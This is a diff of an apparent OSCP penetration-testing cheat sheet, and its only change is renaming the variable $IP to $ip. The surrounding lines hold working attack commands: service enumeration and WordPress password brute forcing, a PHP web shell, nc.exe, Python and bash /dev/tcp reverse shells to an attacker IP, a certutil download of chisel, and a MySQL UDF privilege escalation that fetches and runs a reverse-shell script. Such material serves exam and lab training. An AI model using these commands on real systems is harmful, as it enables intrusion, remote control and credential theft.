@@ -9,11 +9,11 @@ https://github.com/0xsyr0/oscp
 ping $ip #63 ttl = linux #127 ttl = windows
 ````
 ````
-nmap -p- --min-rate 1000 $IP
+nmap -p- --min-rate 1000 $ip
 nmap -p- --min-rate 1000 $ip -Pn #disables the ping command and only scans ports
 ````
 ````
-nmap -p <ports> -sV -sC -A $IP
+nmap -p <ports> -sV -sC -A $ip
 ````
 ### Stealth Scan
 ````
@@ -25,7 +25,7 @@ target/release/rustscan -a 10.11.1.252
 ````
 ### UDP Scan
 ````
-sudo nmap -F -sU -sV $IP
+sudo nmap -F -sU -sV $ip
 ````
 ### Script to automate Network Enumeration
 ````
@@ -46,8 +46,8 @@ autorecon 192.168.238.156 --nmap-append="--min-rate=2500" --exclude-tags="top-10
 #### FTP port 21
 ##### Emumeration
 ````
-ftp -A $IP
-ftp $IP
+ftp -A $ip
+ftp $ip
 anonymous:anonymous
 put test.txt #check if it is reflected in a http port
 ````
@@ -345,7 +345,7 @@ dnsrecon -d heist.example -n 192.168.54.165 -t axfr
 #### HTTP(S) port 80,443
 ##### FingerPrinting
 ````
-whatweb -a 3 $IP
+whatweb -a 3 $ip
 nikto -ask=no -h http://$ip 2>&1
 ````
 ##### Directory Busting
@@ -355,8 +355,8 @@ dirb http://target.com
 ````
 ##### ffuf
 ````
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
-ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$ip/FUZZ
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$ip/FUZZ
 ````
 ###### gobuster
 ````
@@ -365,7 +365,7 @@ gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/dir
 ````
 ###### feroxbuster
 ````
-feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+feroxbuster -u http://<$ip> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
 
 feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #if we dont want to see any denied
 
@@ -480,11 +480,11 @@ service\defaultservice
 ##### CMS 
 ###### WP Scan
 ````
-wpscan --url http://$IP/wp/
+wpscan --url http://$ip/wp/
 ````
 ###### WP Brute Forcing
 ````
-wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
+wpscan --url http://$ip/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
 ````
 ###### simple-file-list
 ````
@@ -710,7 +710,7 @@ Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
 ##### Enumerate
 In this situation we used another service on port 4555 and reset the password of ryuu to test in order to login into pop3 and grab credentials for ssh. SSH later triggered an exploit which caught us a restricted shell as user ryuu
 ````
-nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP
+nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $ip
 ````
 ````
 telnet $ip 110 #Connect to pop3
@@ -722,7 +722,7 @@ retr 1 #retrieve the first email
 #### RPC port 111
 ##### Enumerate
 ````
-nmap -sV -p 111 --script=rpcinfo $IP
+nmap -sV -p 111 --script=rpcinfo $ip
 ````
 #### MSRPC port 135,593
 ##### Enumeration
@@ -738,20 +738,20 @@ While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB ove
 ##### Enumeration
 ###### nmap
 ````
-nmap --script smb-enum-shares.nse -p445 $IP
-nmap –script smb-enum-users.nse -p445 $IP
-nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $IP
-nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $IP
-nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP
+nmap --script smb-enum-shares.nse -p445 $ip
+nmap –script smb-enum-users.nse -p445 $ip
+nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $ip
+nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $ip
+nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $ip
 ````
 ###### OS Discovery
 ````
-nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery $IP
+nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery $ip
 ````
 smbmap
 ````
-smbmap -H $IP
-smbmap -u "user" -p "pass" -H $IP
+smbmap -H $ip
+smbmap -u "user" -p "pass" -H $ip
 smbmap -H $ip -u null
 smbmap -H $ip -P 139 2>&1
 smbmap -H $ip -P 445 2>&1
@@ -760,7 +760,7 @@ smbmap -u null -p "" -H $ip -P 445 -x "ipconfig /all" 2>&1
 ````
 rpcclient
 ````
-rpcclient -U "" -N $IP
+rpcclient -U "" -N $ip
 enumdomusers
 enumdomgroups
 queryuser 0x450
@@ -778,11 +778,11 @@ dsenumdomtrusts
 enum4linux
 ````
 enum4linux -a -M -l -d $ip 2>&1
-enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $IP
+enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $ip
 ````
 crackmapexec
 ````
-crackmapexec smb $IP
+crackmapexec smb $ip
 crackmapexec smb $ip -u "guest" -p ""
 crackmapexec smb $ip --shares -u "guest" -p ""
 crackmapexec smb $ip --shares -u "" -p ""
@@ -790,19 +790,19 @@ crackmapexec smb 10.1.1.68 -u 'guest' -p '' --users
 ````
 smbclient
 ````
-smbclient -U '%' -N \\\\<smb $IP>\\<share name>
-smbclient -U 'guest' \\\\<smb $IP>\\<share name>
+smbclient -U '%' -N \\\\<smb $ip>\\<share name>
+smbclient -U 'guest' \\\\<smb $ip>\\<share name>
 prompt off
 recurse on
 mget *
 ````
 ````
-smbclient -U null -N \\\\<smb $IP>\\<share name>
+smbclient -U null -N \\\\<smb $ip>\\<share name>
 ````
 ````
 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
-smbclient -U '%' -N \\\\$IP\\<share name> -m SMB2
-smbclient -U '%' -N \\\\$IP\\<share name> -m SMB3
+smbclient -U '%' -N \\\\$ip\\<share name> -m SMB2
+smbclient -U '%' -N \\\\$ip\\<share name> -m SMB3
 ````
 ##### smblient random port
 ````
@@ -825,15 +825,15 @@ smb: \> dir
 #### IMAP port 143/993
 ##### Enumeration
 ````
-nmap -p 143 --script imap-ntlm-info $IP
+nmap -p 143 --script imap-ntlm-info $ip
 ````
 #### SNMP port 161 udp
 ````
-sudo nmap --script snmp-* -sU -p161 $IP
+sudo nmap --script snmp-* -sU -p161 $ip
 sudo nmap -sU -p 161 --script snmp-brute $ip --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
 ````
 ````
-snmpwalk -c public -v1 $IP
+snmpwalk -c public -v1 $ip
 ````
 ##### Hacktricks
 ````
@@ -915,7 +915,7 @@ ldapsearch -x -H ldap://192.168.214.122 -b "DC=exampleH,DC=example"
 #### MSSQL port 1433
 ##### Enumeration
 ````
-nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
 ````
 ##### Crackmapexec
 ````
@@ -946,8 +946,8 @@ go
 #### NFS port 2049
 ##### Enumeration
 ````
-showmount $IP
-showmount -e $IP
+showmount $ip
+showmount -e $ip
 ````
 ##### Mounting
 ````
@@ -1541,7 +1541,7 @@ http://192.168.119.146/test.hta
 cat shell.php                   
 echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
 
-http://<$Victim>/site/index.php?page=http://<Your $IP>:80/shell.php&cmd=ping <Your $IP>
+http://<$Victim>/site/index.php?page=http://<Your $ip>:80/shell.php&cmd=ping <Your $ip>
 
 tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
@@ -1574,9 +1574,9 @@ cp /usr/share/webshells/aspx/cmdasp.aspx .
 cp /usr/share/windows-binaries/nc.exe .
 ftp> put cmdasp.aspx
 impacket-smbserver -smb2support Share .
-http://<target $IP>:<port>/cmdasp.aspx
+http://<target $ip>:<port>/cmdasp.aspx
 nc -nlvp <port on your kali>
-cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
+cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $ip> <your nc port>
 ````
 
 ### HTA Attack in Action
@@ -1652,8 +1652,8 @@ End Sub
 ````
 import subprocess
 
-# Replace "<your $IP" and "<your $PORT>" with your target IP address and port
-reverse_shell_command = 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your $IP>',<your $PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"'
+# Replace "<your $ip" and "<your $PORT>" with your target IP address and port
+reverse_shell_command = 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your $ip>',<your $PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"'
 
 try:
     # Execute the reverse shell command
@@ -1680,7 +1680,7 @@ nc -nlvp 443
 ````
 echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
 shell.php&cmd=
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $ip",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 nc -nlvp 22
 or
 
@@ -2206,7 +2206,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 ````
 ````
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' #worked
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $ip",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' #worked
 ````
 ### Windows
 #### Stable shell
@@ -2393,9 +2393,9 @@ vim /etc/proxychains.conf
 # defaults set to "tor"
 #socks4         127.0.0.1 8080
 socks5 127.0.0.1 1080
-certutil -urlcache -split -f http://<your $IP>:<Your Porty>/chisel.exe
+certutil -urlcache -split -f http://<your $ip>:<Your Porty>/chisel.exe
 .\chisel client <your IP>:8000 R:socks #On victim machine
-proxychains psexec.py victim:password@<victim $IP> cmd.exe
+proxychains psexec.py victim:password@<victim $ip> cmd.exe
 ````
 
 ## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />
@@ -2866,7 +2866,7 @@ users with console mysql/bin/bash
 MySQL connection using root/NOPASS Yes
 ````
 ````
-your $IP>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
+your $ip>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
 victim>gcc -g -c raptor_udf2.c
 victim>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 victim>mysql -u root -p
@@ -2885,7 +2885,7 @@ mysql> select * from mysql.func;
 +-----------+-----+----------------+----------+
 ````
 ````
-your $IP> cp /usr/share/webshells/php/php-reverse-shell.php .
+your $ip> cp /usr/share/webshells/php/php-reverse-shell.php .
 mv php-reverse-shell.php shell.php
 nc -nvlp 443
 mysql> select do_system('wget http://192.168.119.184/shell.php -O /tmp/shell.php;php /tmp/shell.php');
@@ -3912,7 +3912,7 @@ INFO: Done in 00M 12S
 #### Network commands
 ````
 arp -a #look for IPs that your victim is connected
-ipconfig #look for a dual victim machine, typically two $IPs shown
+ipconfig #look for a dual victim machine, typically two $ips shown
 ````
 #### User Hunting
 ````
